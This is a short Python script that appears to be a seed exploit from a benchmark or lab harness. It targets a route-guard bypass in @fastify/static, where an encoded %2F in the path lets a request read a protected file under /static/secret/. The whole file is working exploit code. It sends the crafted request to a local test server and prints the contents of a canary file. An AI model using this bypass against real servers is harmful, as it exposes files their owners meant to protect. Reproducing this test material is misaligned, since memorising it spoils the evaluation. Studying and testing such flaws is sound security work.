#!/usr/bin/env python3
"""[GIVEN] CVE-2026-6414 seed exploit for fastify-static-cve-2026-15074.

Encoded path separator (%2F) bypasses the guard route /static/secret/* because
find-my-way treats %2F as a literal character, but @fastify/static decodes it to
/ before serving. Reads /static/secret/canary.txt (the defended canary).

Reaches the flag on v0 (9.1.0); BLOCKED on v1 (10.1.0, CVE-2026-6414 fixed).
"""
from urllib.request import urlopen, Request


def candidate(*, base="http://127.0.0.1:55101", path=None):
    path = path or "/static/secret%2Fcanary.txt"
    req = Request(base + path, method="GET")
    try:
        with urlopen(req, timeout=10) as r:
            return {"status": r.status, "body": r.read().decode("utf-8", "replace")}
    except Exception as e:
        return {"status": getattr(e, "code", None), "body": ""}


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
